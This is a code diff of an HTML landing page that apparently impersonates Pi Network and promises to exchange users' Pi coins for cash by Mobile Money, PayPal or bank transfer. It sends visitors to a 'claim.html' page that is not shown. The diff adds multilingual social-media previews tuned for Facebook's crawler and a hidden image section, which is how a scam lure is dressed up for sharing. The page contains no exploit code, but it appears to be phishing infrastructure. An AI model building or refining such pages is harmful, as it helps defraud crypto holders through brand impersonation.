@@ -3,24 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Pi Network - La Cryptomonnaie Accessible</title>
+    <title>Pi Network - Échangez vos Pi contre de l'argent</title>
     
-    <!-- Balises Open Graph qui pointent vers la page spéciale Facebook -->
-    <meta property="og:title" content="Pi Network - Minez Gratuitement sur Mobile">
-    <meta property="og:description" content="Rejoignez Pi Network et commencez à miner la cryptomonnaie Pi dès maintenant sur votre smartphone. Sans consommation de batterie!">
+    <!-- Balises Open Graph dynamiques -->
+    <meta property="og:title" content="Pi Network - Échangez Pi contre Argent Comptant">
+    <meta property="og:description" content="Échangez vos Pi contre de l'argent réel! Recevez vos paiements par Mobile Money, PayPal ou virement bancaire. Transaction sécurisée et rapide.">
     <meta property="og:image" content="https://i.postimg.cc/3x0Nrn1p/Go-2.png">
     <meta property="og:image:width" content="1200">
     <meta property="og:image:height" content="630">
     <meta property="og:url" content="https://amazingpaye.com">
     <meta property="og:type" content="website">
     <meta property="og:locale" content="fr_FR">
-    <meta property="og:site_name" content="Pi Network">
+    <meta property="og:locale:alternate" content="en_US">
+    <meta property="og:locale:alternate" content="es_ES">
+    <meta property="og:site_name" content="Pi Network Exchange">
     
     <!-- Balises Twitter -->
     <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="Pi Network - Minez Gratuitement sur Mobile">
-    <meta name="twitter:description" content="Rejoignez Pi Network et commencez à miner la cryptomonnaie Pi">
-    <meta name="twitter:image" content="https://votresite.com/facebook-preview.html">
+    <meta name="twitter:title" content="Pi Network - Échangez Pi contre Argent Comptant">
+    <meta name="twitter:description" content="Échangez vos Pi contre de l'argent réel! Mobile Money, PayPal, virement bancaire">
+    <meta name="twitter:image" content="https://i.postimg.cc/3x0Nrn1p/Go-2.png">
 
     <style>
         * {
@@ -66,24 +68,198 @@
             height: auto;
             display: block;
         }
+        
+        /* Section COMPLÈTEMENT masquée pour l'image Facebook */
+        .facebook-section {
+            position: absolute !important;
+            top: -9999px !important;
+            left: -9999px !important;
+            width: 1px !important;
+            height: 1px !important;
+            overflow: hidden !important;
+            opacity: 0 !important;
+            pointer-events: none !important;
+            z-index: -9999 !important;
+            visibility: hidden !important;
+        }
+        
+        .facebook-image {
+            width: 1200px;
+            height: 630px;
+            object-fit: contain;
+        }
     </style>
 </head>
 <body>
+    <!-- Section COMPLÈTEMENT MASQUÉE pour l'image Facebook -->
+    <div class="facebook-section" id="facebookPreview" aria-hidden="true">
+        <img class="facebook-image" 
+             src="https://i.postimg.cc/3x0Nrn1p/Go-2.png" 
+             alt="Pi Network - Échangez vos Pi contre argent"
+             id="ogImage">
+    </div>
+    
     <!-- Image principale cliquable -->
     <img class="main-image" 
          src="https://github.com/Walyy578/Pi-Browser/blob/main/InShot_20250930_103151554.jpg?raw=true" 
-         alt="Image principale Pi Network" 
+         alt="Échangez Pi Network contre argent comptant" 
          onclick="window.location.href='claim.html'">
     
     <!-- Image de continuation -->
     <img class="continuation-image" 
          src="https://github.com/Walyy578/Pi-Browser/blob/main/Screenshot_20250930-163639.jpg?raw=true" 
-         alt="Interface Pi Network">
+         alt="Plateforme d'échange Pi Network">
     
     <!-- Pied de page fixe -->
     <footer class="footer">
         <img src="https://github.com/Walyy578/Pi-Browser/blob/main/InShot_20250930_165420094.jpg?raw=true" 
-             alt="Télécharger Pi Network">
+             alt="Recevez votre argent - Pi Network Exchange">
     </footer>
+
+    <script>
+        // NOUVELLES descriptions pour l'échange de Pi
+        const ogTranslations = {
+            en: {
+                title: "Pi Network - Exchange Pi for Real Money",
+                description: "Exchange your Pi coins for real cash! Receive payments via Mobile Money, PayPal or bank transfer. Secure and fast transactions.",
+                imageAlt: "Pi Network - Exchange Pi for cash"
+            },
+            fr: {
+                title: "Pi Network - Échangez Pi contre Argent Comptant",
+                description: "Échangez vos Pi contre de l'argent réel! Recevez vos paiements par Mobile Money, PayPal ou virement bancaire. Transaction sécurisée et rapide.",
+                imageAlt: "Pi Network - Échangez vos Pi contre argent"
+            },
+            es: {
+                title: "Pi Network - Cambia Pi por Dinero Real",
+                description: "¡Cambia tus Pi por dinero real! Recibe pagos por Mobile Money, PayPal o transferencia bancaria. Transacciones seguras y rápidas.",
+                imageAlt: "Pi Network - Cambia Pi por dinero"
+            },
+            de: {
+                title: "Pi Network - Tausche Pi gegen Echtes Geld",
+                description: "Tauschen Sie Ihre Pi-Münzen gegen echtes Geld! Erhalten Sie Zahlungen per Mobile Money, PayPal oder Banküberweisung. Sichere und schnelle Transaktionen.",
+                imageAlt: "Pi Network - Tausche Pi gegen Bargeld"
+            },
+            ar: {
+                title: "Pi Network - استبدل Pi بأموال حقيقية",
+                description: "استبدل عملات Pi الخاصة بك بأموال حقيقية! استلم المدفوعات عبر Mobile Money أو PayPal أو التحويل البنكي. معاملات آمنة وسريعة.",
+                imageAlt: "Pi Network - استبدل Pi بالنقود"
+            },
+            pt: {
+                title: "Pi Network - Troque Pi por Dinheiro Real",
+                description: "Troque suas moedas Pi por dinheiro real! Receba pagamentos via Mobile Money, PayPal ou transferência bancária. Transações seguras e rápidas.",
+                imageAlt: "Pi Network - Troque Pi por dinheiro"
+            },
+            ru: {
+                title: "Pi Network - Обменяйте Pi на Наличные",
+                description: "Обменивайте свои монеты Pi на реальные деньги! Получайте платежи через Mobile Money, PayPal или банковский перевод. Безопасные и быстрые транзакции.",
+                imageAlt: "Pi Network - Обмен Pi на деньги"
+            },
+            zh: {
+                title: "Pi Network - 将Pi兑换成现金",
+                description: "将您的Pi币兑换成真实现金！通过Mobile Money、PayPal或银行转账收款。安全快速的交易。",
+                imageAlt: "Pi Network - 将Pi兑换成现金"
+            }
+        };
+
+        // Détection de la langue pour Facebook
+        function detectFacebookLanguage() {
+            // 1. Vérifier les paramètres d'URL en premier
+            const urlParams = new URLSearchParams(window.location.search);
+            const forcedLang = urlParams.get('lang');
+            if (forcedLang && ogTranslations[forcedLang]) {
+                return forcedLang;
+            }
+
+            // 2. Vérifier fb_locale (utilisé par Facebook)
+            if (window.location.search.includes('fb_locale')) {
+                const fbLocale = urlParams.get('fb_locale');
+                if (fbLocale.startsWith('fr')) return 'fr';
+                else if (fbLocale.startsWith('es')) return 'es';
+                else if (fbLocale.startsWith('de')) return 'de';
+                else if (fbLocale.startsWith('ar')) return 'ar';
+                else if (fbLocale.startsWith('pt')) return 'pt';
+                else if (fbLocale.startsWith('ru')) return 'ru';
+                else if (fbLocale.startsWith('zh')) return 'zh';
+            }
+
+            // 3. Détection par navigateur pour Facebook
+            const userAgent = navigator.userAgent.toLowerCase();
+            const isFacebookBot = userAgent.includes('facebookexternalhit');
+            
+            if (isFacebookBot) {
+                const browserLang = navigator.language || navigator.userLanguage;
+                if (browserLang.startsWith('fr')) return 'fr';
+                if (browserLang.startsWith('es')) return 'es';
+                if (browserLang.startsWith('de')) return 'de';
+                if (browserLang.startsWith('ar')) return 'ar';
+                if (browserLang.startsWith('pt')) return 'pt';
+                if (browserLang.startsWith('ru')) return 'ru';
+                if (browserLang.startsWith('zh')) return 'zh';
+            }
+
+            // 4. Par défaut français (ou anglais si vous préférez)
+            return 'fr';
+        }
+
+        // Mettre à jour les balises OG selon la langue
+        function updateOGTags(lang) {
+            const translation = ogTranslations[lang] || ogTranslations.fr;
+            
+            // Mettre à jour les balises OG (pour Facebook)
+            document.querySelector('meta[property="og:title"]').setAttribute('content', translation.title);
+            document.querySelector('meta[property="og:description"]').setAttribute('content', translation.description);
+            document.querySelector('meta[property="og:locale"]').setAttribute('content', getLocaleCode(lang));
+            
+            // Mettre à jour Twitter
+            document.querySelector('meta[name="twitter:title"]').setAttribute('content', translation.title);
+            document.querySelector('meta[name="twitter:description"]').setAttribute('content', translation.description);
+            
+            // Mettre à jour l'image alt (masquée)
+            document.getElementById('ogImage').alt = translation.imageAlt;
+            
+            // Mettre à jour le titre de la page
+            document.title = translation.title;
+        }
+
+        // Obtenir le code locale
+        function getLocaleCode(lang) {
+            const locales = {
+                'en': 'en_US',
+                'fr': 'fr_FR', 
+                'es': 'es_ES',
+                'de': 'de_DE',
+                'ar': 'ar_AR',
+                'pt': 'pt_BR',
+                'ru': 'ru_RU',
+                'zh': 'zh_CN'
+            };
+            return locales[lang] || 'fr_FR';
+        }
+
+        // Initialisation au chargement
+        document.addEventListener('DOMContentLoaded', function() {
+            const detectedLang = detectFacebookLanguage();
+            updateOGTags(detectedLang);
+            
+            // Forcer le chargement de l'image OG pour Facebook
+            const ogImage = new Image();
+            ogImage.src = 'https://i.postimg.cc/3x0Nrn1p/Go-2.png?' + new Date().getTime();
+            
+            console.log('Facebook OG tags configured for language:', detectedLang);
+        });
+
+        // Fonction pour debugger
+        function debugOGTags() {
+            console.log('=== OG TAGS DEBUG ===');
+            console.log('Detected Language:', detectFacebookLanguage());
+            console.log('OG Title:', document.querySelector('meta[property="og:title"]').content);
+            console.log('OG Description:', document.querySelector('meta[property="og:description"]').content);
+            console.log('OG Image:', document.querySelector('meta[property="og:image"]').content);
+            console.log('=====================');
+        }
+
+        // Appeler debug pour vérification
+        setTimeout(debugOGTags, 1000);
+    </script>
 </body>
 </html>
